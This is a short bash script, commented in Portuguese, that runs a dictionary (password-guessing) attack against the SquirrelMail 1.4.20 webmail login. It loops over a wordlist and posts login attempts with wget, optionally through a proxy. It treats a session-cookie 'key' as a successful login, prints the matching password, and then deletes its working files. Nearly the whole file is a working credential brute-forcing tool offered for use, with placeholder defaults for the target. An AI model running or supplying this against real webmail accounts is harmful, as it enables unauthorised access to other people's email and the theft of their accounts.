#!/bin/bash

#########################################################################################
#                   Ataque de Dicionario em SquirrelMail 1.4.20                         #
#                                                                                       #
#       Entrada: wordlist - lista de possiveis senhas                                   #
#                url      - url alvo                                                    #
#                usuario  - login alvo                                                  #
#                [proxy]  - <opcional> caso esteja atras de um proxy                    #
#                                                                                       #
#                                                                                       #
#########################################################################################

check_input(){
echo "USAGE:./script WORDLIST URL USER PROXY" $1 $2 $3 $4
if [[ -z $2 ]]
then
  URL="http://target.com/webmail/src"
fi
if [[ -z $3 ]]
then
  USER="john.doe"
fi
if [[ -z $4 ]]
then
  PROXY=""
fi
}

check_input $1 $2 $3 $4

for PASSWD in $(cat $1)
do
  if [[ -z $PROXY ]]
  then
    wget -q --save-cookies="$PASSWD".cok --keep-session-cookies --post-data 'login_username='$USER'&secretkey='$PASSWD'&js_autodetect_results=1&just_logged_in=0&button=entrar' $URL/redirect.php
    wget -q --load-cookies="$PASSWD".cok --post-data 'login_username='$USER'&secretkey='$PASSWD'&js_autodetect_results=1&just_logged_in=0&button=entrar' $URL/webmail.php
  else
    wget -q -e 'http_proxy='$PROXY --save-cookies="$PASSWD".cok --keep-session-cookies --post-data 'login_username='$USER'&secretkey='$PASSWD'&js_autodetect_results=1&just_logged_in=0&button=entrar' $URL/redirect.php
    wget -q -e 'http_proxy='$PROXY --load-cookies="$PASSWD".cok --post-data 'login_username='$USER'&secretkey='$PASSWD'&js_autodetect_results=1&just_logged_in=0&button=entrar' $URL/webmail.php
  fi
  RESULT=$(egrep -l "key" $PASSWD.cok)
  if [[ -n $RESULT ]]
  then
    echo $RESULT | awk -F".cok" {'print $1'}
  fi
done;

rm *php*
rm *cok*

exit 0


